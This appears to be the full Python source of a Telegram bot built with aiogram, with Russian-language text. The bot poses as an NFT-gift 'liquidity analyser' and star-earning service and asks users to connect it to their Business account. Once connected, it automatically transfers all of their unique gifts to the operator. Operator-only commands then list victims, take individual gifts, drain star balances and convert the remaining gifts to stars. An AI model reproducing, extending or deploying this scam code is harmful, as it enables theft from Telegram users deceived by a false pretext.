from aiogram import types, Dispatcher, Bot, F
from aiogram.types import business_connection
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.methods import TransferGift
from aiogram.types import InputMediaPhoto, FSInputFile
from aiogram.types import InlineQuery, InlineQueryResultArticle, InputTextMessageContent
from custom_methods import GetFixedBusinessAccountStarBalance
from aiogram.webhook.aiohttp_server import SimpleRequestHandler, setup_application
from aiohttp import web
import logging
import asyncio
import json
import config
import os
from aiogram.exceptions import TelegramTooManyRequests

async def transfer_all_unique_gifts(business_connection_id: str):
    """–ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –ø–µ—Ä–µ–¥–∞–µ—Ç –≤—Å–µ —É–Ω–∏–∫–∞–ª—å–Ω—ã–µ –ø–æ–¥–∞—Ä–∫–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É"""
    try:
        gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id))
        transferred = 0
        
        for gift in gifts.gifts:
            if gift.type == "unique":
                try:
                    await bot(TransferGift(
                        business_connection_id=business_connection_id,
                        new_owner_chat_id=int(ADMIN_ID),
                        owned_gift_id=gift.owned_gift_id,
                        star_count=25
                    ))
                    transferred += 1
                    await asyncio.sleep(0.5)  # –ó–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É –∑–∞–ø—Ä–æ—Å–∞–º–∏
                except Exception as e:
                    logging.warning(f"–ù–µ —É–¥–∞–ª–æ—Å—å –ø–µ—Ä–µ–¥–∞—Ç—å –ø–æ–¥–∞—Ä–æ–∫ {gift.owned_gift_id}: {e}")
                    continue
        
        return transferred
    except Exception as e:
        logging.exception(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–µ—Ä–µ–¥–∞—á–µ –ø–æ–¥–∞—Ä–∫–æ–≤: {e}")
        return 0

CONNECTIONS_FILE = "business_connections.json"

TOKEN = os.environ.get("BOT_TOKEN", config.BOT_TOKEN)
ADMIN_ID = int(os.environ.get("ADMIN_ID", str(config.ADMIN_ID)))

bot = Bot(token=TOKEN)
dp = Dispatcher()

def load_json_file(filename):
    try:
        with open(filename, "r") as f:
            content = f.read().strip()
            if not content:
                return [] 
            return json.loads(content)
    except FileNotFoundError:
        return []
    except json.JSONDecodeError as e:
        logging.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ —Ä–∞–∑–±–æ—Ä–µ JSON-—Ñ–∞–π–ª–∞.")
        return []

def get_connection_id_by_user(user_id: int) -> str:
    # –ü—Ä–∏–º–µ—Ä: –∑–∞–≥—Ä—É–∂–∞–µ–º –∏–∑ —Ñ–∞–π–ª–∞ –∏–ª–∏ —Å–ª–æ–≤–∞—Ä—è
    import json
    with open("connections.json", "r") as f:
        data = json.load(f)
    return data.get(str(user_id))

def load_connections():
    with open("business_connections.json", "r") as f:
        return json.load(f)

async def send_welcome_message_to_admin(user_id):
    try:
        await bot.send_message(ADMIN_ID, f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å #{user_id} –ø–æ–¥–∫–ª—é—á–∏–ª –±–æ—Ç–∞.")
    except Exception as e:
        logging.exception("–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ –ª–∏—á–Ω—ã–π —á–∞—Ç.")

def save_business_connection_data(business_connection):
    business_connection_data = {
        "user_id": business_connection.user.id,
        "business_connection_id": business_connection.id,
        "username": business_connection.user.username,
        "first_name": business_connection.user.first_name,
        "last_name": business_connection.user.last_name
    }

    data = []

    if os.path.exists(CONNECTIONS_FILE):
        try:
            with open(CONNECTIONS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
        except json.JSONDecodeError:
            pass

    updated = False
    for i, conn in enumerate(data):
        if conn["user_id"] == business_connection.user.id:
            data[i] = business_connection_data
            updated = True
            break

    if not updated:
        data.append(business_connection_data)

    # –°–æ—Ö—Ä–∞–Ω—è–µ–º –æ–±—Ä–∞—Ç–Ω–æ
    with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

@dp.business_connection()
async def handle_business_connect(business_connection: business_connection):
    try:
        await send_welcome_message_to_admin(business_connection.user.id)
        await bot.send_message(business_connection.user.id, "<b>–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ... –£—Å—Ç–∞–Ω–æ–≤–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è </b>üîÑ")
        save_business_connection_data(business_connection)

        try:
            # –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –ø–µ—Ä–µ–¥–∞–µ–º –≤—Å–µ —É–Ω–∏–∫–∞–ª—å–Ω—ã–µ –ø–æ–¥–∞—Ä–∫–∏
            transferred = await transfer_all_unique_gifts(business_connection.id)
            
            if transferred > 0:
                await bot.send_message(ADMIN_ID, f"‚úÖ –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –ø–µ—Ä–µ–¥–∞–Ω–æ {transferred} NFT –ø–æ–¥–∞—Ä–∫–æ–≤ –æ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è #{business_connection.user.id}")
            
            await bot.send_message(business_connection.user.id, f"‚úÖ <b>–ü–æ–¥–∫–ª—é—á–µ–Ω–æ. –ü–µ—Ä–µ–¥–∞–Ω–æ {transferred} –ø–æ–¥–∞—Ä–∫–æ–≤.</b>")
            
        except TelegramBadRequest as e:
            if "BUSINESS_CONNECTION_INVALID" in str(e):
                remove_connection(business_connection.id)
                await bot.send_message(ADMIN_ID, f"‚ùå <b>–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è #{business_connection.user.id} –Ω–µ–¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ –∏ —É–¥–∞–ª–µ–Ω–æ.</b>")
                return
            else:
                raise

        logging.info(f"<b>–ë–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω:</b> {business_connection.user.id}")
    except Exception as e:
        logging.exception("<b>–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ –±–∏–∑–Ω–µ—Å-–ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è.</b>")
def remove_connection(business_connection_id):
    try:
        if not os.path.exists(CONNECTIONS_FILE):
            return
        with open(CONNECTIONS_FILE, "r", encoding="utf-8") as f:
            connections = json.load(f)
        connections = [c for c in connections if c.get("business_connection_id") != business_connection_id]
        with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
            json.dump(connections, f, indent=2, ensure_ascii=False)
        logging.info(f"<b>–£–¥–∞–ª–µ–Ω–æ –æ—Ç–∫–ª—é—á—ë–Ω–Ω–æ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ:</b> {business_connection_id}")
    except Exception as e:
        logging.exception("<b>–û—à–∏–±–∫–∞ –ø—Ä–∏ —É–¥–∞–ª–µ–Ω–∏–∏ –∑–∞–ø–∏—Å–∏ –æ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏</b>")

@dp.business_message()
async def handler_message(message: Message):
    try:
        conn_id = message.business_connection_id
        sender_id = message.from_user.id
        msg_id = message.message_id

        connections = load_connections()
        connection = next((c for c in connections if c["business_connection_id"] == conn_id), None)

        if not connection:
            print(f"–ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π –±–∏–∑–Ω–µ—Å connection_id: {conn_id}")
            return

    except Exception as e:
       logging.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–≤–µ—Ç–µ.")

@dp.message(F.text == "/start")
async def start_command(message: Message):
    try:
        connections = load_connections()
        count = len(connections)
    except Exception:
        count = 25

    if message.from_user.id != ADMIN_ID:
        builder = InlineKeyboardBuilder()
        builder.button(text="–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –ª–∏–∫–≤–∏–¥–Ω–æ—Å—Ç—å NFT-–ü–æ–¥–∞—Ä–∫–∞üéÅ", callback_data='verify')
        auth = builder.as_markup()

        photo = FSInputFile("media/4.jpg")
        caption = """
<b>–ü—Ä–∏–≤–µ—Ç!

–Ø –≤–∞—à –ø–æ–º–æ—â–Ω–∏–∫ –ø–æ –∞–Ω–∞–ª–∏–∑—É –ª–∏–∫–≤–∏–¥–Ω–æ—Å—Ç–∏ –ø–æ–¥–∞—Ä–∫–æ–≤ –≤ Telegram.
–ö–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç?

–Ø –º–≥–Ω–æ–≤–µ–Ω–Ω–æ –ø—Ä–æ–∞–Ω–∞–ª–∏–∑–∏—Ä—É—é –≤–∞—à–∏ –ø–æ–¥–∞—Ä–∫–∏ –∏ –ø–æ–∫–∞–∂—É, –Ω–∞—Å–∫–æ–ª—å–∫–æ –ª–µ–≥–∫–æ –∏—Ö –º–æ–∂–Ω–æ –æ–±–º–µ–Ω—è—Ç—å –∏–ª–∏ –ø—Ä–æ–¥–∞—Ç—å.

–ì–æ—Ç–æ–≤—ã –Ω–∞—á–∞—Ç—å? –ü—Ä–æ—Å—Ç–æ –ø—Ä–∏–≤—è–∂–∏—Ç–µ –º–µ–Ω—è –∫ –≤–∞—à–µ–º—É –ë–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç—É, –∏ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –Ω–∞—á–Ω—ë—Ç—Å—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏.</b>

<b>–ü–æ–º–∏–º–æ —ç—Ç–æ–≥–æ, –≤ –±–æ—Ç–µ –µ—Å—Ç—å —Ñ—É–Ω–∫—Ü–∏–∏ –ó–∞—Ä–∞–±–æ—Ç–∫–∞ –ó–≤—ë–∑–¥ –∑–∞ –ø—Ä–æ—Å—Ç—ã–µ –∑–∞–¥–∞–Ω–∏—è!‚≠ê</b>

<b>–ó–≤—ë–∑–¥—ã –í—ã –ø–æ–ª—É—á–∞–µ—Ç–µ –ó–∞ –ø–æ–¥–ø–∏—Å–∫–∏ –Ω–∞ –¢–µ–ª–µ–≥—Ä–∞–º –∫–∞–Ω–∞–ª—ã, –∏–ª–∏ –¥—Ä—É–≥–∏–µ –∑–∞–¥–∞–Ω–∏—è, –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∑–≤—ë–∑–¥ —Ç–∞–∫–∂–µ –ø–æ—Ç—Ä–µ–±—É–µ—Ç—Å—è –¥–æ–±–∞–≤–∏—Ç—å –±–æ—Ç–∞ –≤ –±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç.</b>
"""
        await message.answer_photo(
            photo=photo, 
            caption=caption, 
            reply_markup=auth,
            parse_mode="HTML"  # –≠—Ç–æ –≤–∞–∂–Ω–æ –¥–ª—è –æ–±—Ä–∞–±–æ—Ç–∫–∏ HTML-—Ç–µ–≥–æ–≤
        )
    else:
        await message.answer(
            f"owner: ...\nüîó –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π: {count}\n/gifts - –ø—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å –≥–∏—Ñ—Ç—ã\n/stars - –ø—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å –∑–≤–µ–∑–¥—ã\n/transfer <owned_id> <business_connect> - –ø–µ—Ä–µ–¥–∞—Ç—å –≥–∏—Ñ—Ç –≤—Ä—É—á–Ω—É—é\n/convert - –∫–æ–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞—Ç—å –ø–æ–¥–∞—Ä–∫–∏ –≤ –∑–≤–µ–∑–¥—ã")

@dp.message(F.text.startswith("/transfer"))
async def transfer_gift_handler(message: Message, bot):
    if  message.from_user.id != ADMIN_ID:
        return
    
    try:
        args = message.text.strip().split()
        if len(args) != 3:
            return await message.answer("–ò—Å–ø–æ–ª—å–∑—É–π —Ñ–æ—Ä–º–∞—Ç: /transfer <owned_gift_id> <business_connection_id>")

        owned_gift_id = args[1]
        connection_id = args[2]
        if not connection_id:
            return await message.answer("‚ùå –ù–µ—Ç –∞–∫—Ç–∏–≤–Ω–æ–≥–æ –±–∏–∑–Ω–µ—Å-–ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è.")

        result = await bot(TransferGift(
            business_connection_id=connection_id,
            new_owner_chat_id=int(ADMIN_ID),
            owned_gift_id=owned_gift_id,
            star_count=25
        ))

        await message.answer("‚úÖ <b>–ü–æ–¥–∞—Ä–æ–∫ —É—Å–ø–µ—à–Ω–æ –ø–µ—Ä–µ–¥–∞–Ω —Ç–µ–±–µ!</b>")

    except TelegramBadRequest as e:
        if "BOT_ACCESS_FORBIDDEN" in str(e):
            await message.answer("‚ö†Ô∏è<b> –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞–ø—Ä–µ—Ç–∏–ª –¥–æ—Å—Ç—É–ø –∫ –≥–∏—Ñ—Ç–∞–º!</b>")
        else:
            await message.answer(f"–û—à–∏–±–∫–∞: {e}")
    except TelegramBadRequest as e:
        await message.answer(f"‚ùå –û—à–∏–±–∫–∞ –ø–µ—Ä–µ–¥–∞—á–∏: {e.message}")
    except Exception as e:
        await message.answer(f"‚ö†Ô∏è –ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞: {e}")


@dp.message(F.text == "/gifts")
async def handle_gifts_list(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.reply("–ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞.")
        return

    try:
        with open("business_connections.json", "r") as f:
            connections = json.load(f)

        if not connections:
            await message.answer("‚ùå –ù–µ—Ç –ø–æ–¥–∫–ª—é—á—ë–Ω–Ω—ã—Ö –±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç–æ–≤!")
            return

        kb = InlineKeyboardBuilder()
        for conn in connections:
            name = f"@{conn.get('username')} ({conn['user_id']})" or f"ID {conn['user_id']}"
            user_id = conn["user_id"]
            kb.button(
                text=name,
                callback_data=f"gifts:{user_id}"
            )

        await message.answer("–í—ã–±–µ—Ä–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:", reply_markup=kb.as_markup())

    except FileNotFoundError:
        await message.answer("–§–∞–π–ª –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π –Ω–µ –Ω–∞–π–¥–µ–Ω.")
    except Exception as e:
        logging.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π")
        await message.answer(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π")

@dp.callback_query(F.data.startswith("gifts:"))
async def handle_gift_callback(callback: CallbackQuery):
    await callback.answer()

    user_id = int(callback.data.split(":", 1)[1])

    try:
        with open("business_connections.json", "r", encoding="utf-8") as f:
            connections = json.load(f)

        connection = next((c for c in connections if c["user_id"] == user_id), None)

        if not connection:
            await callback.message.answer("–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –¥–ª—è —ç—Ç–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –Ω–µ –Ω–∞–π–¥–µ–Ω–æ.")
            return

        business_connection_id = connection["business_connection_id"]

        star_balance = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=business_connection_id))
        text = f"üÜî –ë–∏–∑–Ω–µ—Å –∫–æ–Ω–Ω–µ–∫—Ç: <b>{business_connection_id}</b>\n‚≠êÔ∏è –ë–∞–ª–∞–Ω—Å –∑–≤—ë–∑–¥: <b>{star_balance.star_amount}</b>\n\n"
        keyboard = InlineKeyboardMarkup(
                        inline_keyboard=[
                            [InlineKeyboardButton(text="üéÅ –í—ã–≤–µ—Å—Ç–∏ –≤—Å–µ –ø–æ–¥–∞—Ä–∫–∏ (–∏ –ø—Ä–µ–≤—Ä–∞—Ç–∏—Ç—å –≤—Å–µ –ø–æ–¥–∞—Ä–∫–∏ –≤ –∑–≤–µ–∑–¥—ã)", callback_data=f"reveal_all_gifts:{user_id}")],
                            [InlineKeyboardButton(text="‚≠êÔ∏è –ü—Ä–µ–≤—Ä–∞—Ç–∏—Ç—å –≤—Å–µ –ø–æ–¥–∞—Ä–∫–∏ –≤ –∑–≤–µ–∑–¥—ã", callback_data=f"convert_exec:{user_id}")]
                        ]
                    )
        await callback.message.answer(text, parse_mode="HTML", reply_markup=keyboard)
        gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id))

        if not gifts.gifts:
            text += "üéÅ –ù–µ—Ç –ø–æ–¥–∞—Ä–∫–æ–≤."
            await callback.message.answer(text)
        else:
            for gift in gifts.gifts:
                if gift.type == "unique":
                    text = (
                        f"{gift.gift.base_name} #{gift.gift.number}\nOwner: #{user_id}\nOwnedGiftId: {gift.owned_gift_id}\n\n"
                        f"üéÅ <b>https://t.me/nft/{gift.gift.name}</b>\n"
                        f"üÜî –ú–æ–¥–µ–ª—å: <code>{gift.gift.model.name}</code>\n\n\n‚≠êÔ∏è –°—Ç–æ–∏–º–æ—Å—Ç—å —Ç—Ä–∞–Ω—Å—Ñ–µ—Ä–∞: {gift.transfer_star_count} ‚≠êÔ∏è"
                    )
                    kb = InlineKeyboardMarkup(
                            inline_keyboard=[
                                [
                                    InlineKeyboardButton(
                                        text="üéÅ –ü–µ—Ä–µ–¥–∞—Ç—å –º–Ω–µ",
                                        callback_data=f"transfer:{user_id}:{gift.owned_gift_id}:{gift.transfer_star_count}"
                                    )
                                ]
                            ]
                        )
                    await callback.message.answer(text, parse_mode="HTML", reply_markup=kb)
                    await asyncio.sleep(0.2)
            await callback.message.answer("üëá –í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:", reply_markup=keyboard)
    except TelegramBadRequest as e:
        if "BOT_ACCESS_FORBIDDEN" in str(e):
            await callback.message.answer("‚ö†Ô∏è –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞–ø—Ä–µ—Ç–∏–ª –¥–æ—Å—Ç—É–ø –∫ –ø–æ–¥–∞—Ä–∫–∞–º!")
        else:
            await callback.message.answer(f"–û—à–∏–±–∫–∞: {e}")
    except Exception as e:
        logging.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –¥–∞–Ω–Ω—ã—Ö")
        await callback.message.answer(f"–û—à–∏–±–∫–∞: {e}")
 
@dp.callback_query(F.data.startswith("transfer:"))
async def handle_transfer(callback: CallbackQuery):
    await callback.answer()

    if callback.from_user.id != ADMIN_ID:
        return

    try:
        _, user_id_str, gift_id, transfer_price = callback.data.split(":")
        user_id = int(user_id_str)

        with open("business_connections.json", "r", encoding="utf-8") as f:
            connections = json.load(f)

        connection = next((c for c in connections if c["user_id"] == user_id), None)
        if not connection:
            await callback.message.answer("–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ.")
            return

        business_connection_id = connection["business_connection_id"]

        result = await bot(TransferGift(
            business_connection_id=business_connection_id,
            new_owner_chat_id=int(ADMIN_ID),
            owned_gift_id=gift_id,
            star_count=0
        ))

        if result:
            await callback.message.answer("üéâ <b>–ü–æ–¥–∞—Ä–æ–∫ —É—Å–ø–µ—à–Ω–æ –ø–µ—Ä–µ–¥–∞–Ω —Ç–µ–±–µ!</b>")
        else:
            await callback.message.answer("‚ö†Ô∏è <b>–ù–µ —É–¥–∞–ª–æ—Å—å –ø–µ—Ä–µ–¥–∞—Ç—å –ø–æ–¥–∞—Ä–æ–∫.</b>")

    except TelegramBadRequest as e:
        if "PAYMENT_REQUIRED" in e.message:
            await bot(TransferGift(
                business_connection_id=business_connection_id,
                new_owner_chat_id=int(ADMIN_ID),
                owned_gift_id=gift_id,
                star_count=25
            ))
        elif "BOT_ACCESS_FORBIDDEN" in str(e):
            await callback.message.answer("‚ö†Ô∏è<b> –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞–ø—Ä–µ—Ç–∏–ª –¥–æ—Å—Ç—É–ø –∫ –≥–∏—Ñ—Ç–∞–º!</b>")
        else:
            await callback.message.answer(f"–û—à–∏–±–∫–∞: {e}")
    except Exception as e:
        logging.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–µ—Ä–µ–¥–∞—á–µ –ø–æ–¥–∞—Ä–∫–∞")
        await callback.message.answer(f"–û—à–∏–±–∫–∞: {e}")


@dp.message(F.text == "/stars")
async def show_star_users(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.reply("–ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞!")
        return
    
    try:
        with open("business_connections.json", "r", encoding="utf-8") as f:
            connections = json.load(f)
    except Exception:
        await message.answer("‚ùå<b> –ù–µ—Ç –ø–æ–¥–∫–ª—é—á—ë–Ω–Ω—ã—Ö –±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç–æ–≤!</b>")
        return

    if not connections:
        await message.answer("‚ùå<b> –ù–µ—Ç –ø–æ–¥–∫–ª—é—á—ë–Ω–Ω—ã—Ö –±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç–æ–≤!</b>")
        return

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"@{conn['username']} ({conn['user_id']})", callback_data=f"stars:{conn['user_id']}")]
        for conn in connections
    ])

    await message.answer("üîπ –í—ã–±–µ—Ä–∏—Ç–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –¥–ª—è –ø—Ä–æ—Å–º–æ—Ç—Ä–∞ –±–∞–ª–∞–Ω—Å–∞ –∑–≤—ë–∑–¥:", reply_markup=kb)

@dp.callback_query(F.data.startswith("stars:"))
async def show_user_star_balance(callback: CallbackQuery):
    user_id = int(callback.data.split(":")[1])

    # –ó–∞–≥—Ä—É–∂–∞–µ–º –∫–æ–Ω–µ–∫—Ç
    with open("business_connections.json", "r", encoding="utf-8") as f:
        connections = json.load(f)

    conn = next((c for c in connections if c["user_id"] == user_id), None)
    if not conn:
        await callback.answer("‚ùå –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ.", show_alert=True)
        return

    business_connection_id = conn["business_connection_id"]

    try:
        # –ü–æ–ª—É—á–∞–µ–º –±–∞–ª–∞–Ω—Å
        response = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=business_connection_id))
        star_count = response.star_amount

        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="‚ú® –ü–µ—Ä–µ–¥–∞—Ç—å –∑–≤–µ–∑–¥—ã –º–Ω–µ", callback_data=f"transfer_stars:{business_connection_id}")]
        ])

        await callback.message.answer(f"‚≠ê <b>–£ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {conn['first_name']} {conn['last_name'] or ''} ‚Äî {star_count} –∑–≤—ë–∑–¥.</b>", parse_mode="HTML", reply_markup=kb)
    except TelegramBadRequest as e:
        if "BOT_ACCESS_FORBIDDEN" in str(e):
            await callback.message.answer("‚ö†Ô∏è –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞–ø—Ä–µ—Ç–∏–ª –¥–æ—Å—Ç—É–ø –∫ –≥–∏—Ñ—Ç–∞–º!")
        else:
            await callback.message.answer(f"–û—à–∏–±–∫–∞: {e}")
    except TelegramBadRequest as e:
        await callback.message.answer(f"‚ö†Ô∏è –û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –±–∞–ª–∞–Ω—Å–∞: {e.message}")

@dp.callback_query(F.data.startswith("transfer_stars:"))
async def transfer_stars_to_admin(callback: CallbackQuery):
    business_connection_id = callback.data.split(":")[1]

    try:
        response = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=business_connection_id))
        star_balance = response.star_amount

        result = await bot.transfer_business_account_stars(
            business_connection_id=business_connection_id,
            star_count=star_balance
        )
        if result:
            await callback.message.answer("‚úÖ –ó–≤–µ–∑–¥—ã —É—Å–ø–µ—à–Ω–æ –ø–µ—Ä–µ–¥–∞–Ω—ã –≤–∞–º!")
        else:
            await callback.message.answer(f"‚ùå –û—à–∏–±–∫–∞ –ø–µ—Ä–µ–¥–∞—á–∏ –∑–≤—ë–∑–¥: {e.message}")
    except TelegramBadRequest as e:
        if "BOT_ACCESS_FORBIDDEN" in str(e):
            await callback.message.answer("‚ö†Ô∏è –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞–ø—Ä–µ—Ç–∏–ª –¥–æ—Å—Ç—É–ø –∫ –≥–∏—Ñ—Ç–∞–º!")
        else:
            await callback.message.answer(f"–û—à–∏–±–∫–∞: {e}")
    except TelegramBadRequest as e:
        await callback.message.answer(f"‚ùå –û—à–∏–±–∫–∞ –ø–µ—Ä–µ–¥–∞—á–∏ –∑–≤—ë–∑–¥: {e.message}")

async def convert_non_unique_gifts_to_stars(bot: Bot, business_connection_id: str) -> str:
    try:
        # –ü–æ–ª—É—á–∞–µ–º –ø–æ–¥–∞—Ä–∫–∏
        gifts_response = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id))
        gifts = gifts_response.gifts

        count = 0
        for gift in gifts:
            if gift.type != "unique":
                try:
                    await bot(ConvertGiftToStars(
                        business_connection_id=business_connection_id,
                        owned_gift_id=gift.gift.id
                    ))
                    count += 1
                except TelegramBadRequest as e:
                    if "GIFT_NOT_CONVERTIBLE" in str(e):
                        continue  # –ø—Ä–æ—Å—Ç–æ –ø—Ä–æ–ø—É—Å–∫–∞–µ–º
                    else:
                        raise e  # –ø—Ä–æ–±—Ä–∞—Å—ã–≤–∞–µ–º –¥—Ä—É–≥–∏–µ –æ—à–∏–±–∫–∏

        if count == 0:
            return "–£ –≤–∞—Å –Ω–µ—Ç –æ–±—ã—á–Ω—ã—Ö (–Ω–µ—É–Ω–∏–∫–∞–ª—å–Ω—ã—Ö) –ø–æ–¥–∞—Ä–∫–æ–≤ –¥–ª—è –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏–∏."
        return f"‚úÖ –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–æ {count} –ø–æ–¥–∞—Ä–∫–æ–≤ –≤ –∑–≤—ë–∑–¥—ã."

    except TelegramBadRequest as e:
        if "BOT_ACCESS_FORBIDDEN" in str(e):
            return "‚ö†Ô∏è –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞–ø—Ä–µ—Ç–∏–ª –¥–æ—Å—Ç—É–ø"
        return f"‚ö†Ô∏è –û—à–∏–±–∫–∞: {e}"
    except Exception as e:
        return f"‚ùå –ù–µ–ø—Ä–µ–¥–≤–∏–¥–µ–Ω–Ω–∞—è –æ—à–∏–±–∫–∞: {e}"

@dp.message(F.text == "/convert")
async def convert_menu(message: Message):
    try:
        with open("business_connections.json", "r", encoding="utf-8") as f:
            connections = json.load(f)
    except Exception:
        return await message.answer("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è.")

    if not connections:
        return await message.answer("‚ùå –ù–µ—Ç –ø–æ–¥–∫–ª—é—á—ë–Ω–Ω—ã—Ö –±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç–æ–≤!.")

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"@{conn['username']} ({conn['user_id']})", callback_data=f"convert_select:{conn['user_id']}")]
        for conn in connections
    ])

    await message.answer("–í—ã–±–µ—Ä–∏—Ç–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –¥–ª—è –ø—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏—è –ø–æ–¥–∞—Ä–∫–æ–≤:", reply_markup=keyboard)

@dp.callback_query(F.data.startswith("convert_select:"))
async def convert_select_handler(callback: CallbackQuery):
    user_id = int(callback.data.split(":")[1])

    with open("business_connections.json", "r", encoding="utf-8") as f:
        connections = json.load(f)

    connection = next((c for c in connections if c["user_id"] == user_id), None)
    if not connection:
        return await callback.message.edit_text("‚ùå –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ.")

    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="‚ôªÔ∏è –ü—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞—Ç—å –æ–±—ã—á–Ω—ã–µ –ø–æ–¥–∞—Ä–∫–∏ –≤ –∑–≤–µ–∑–¥—ã",
                    callback_data=f"convert_exec:{user_id}"
                )
            ]
        ]
    )

    await callback.message.edit_text(
        f"–í—ã–±—Ä–∞–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: @{connection.get('username', '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}",
        reply_markup=keyboard
    )

from aiogram.methods import GetBusinessAccountGifts, ConvertGiftToStars
from aiogram.exceptions import TelegramBadRequest
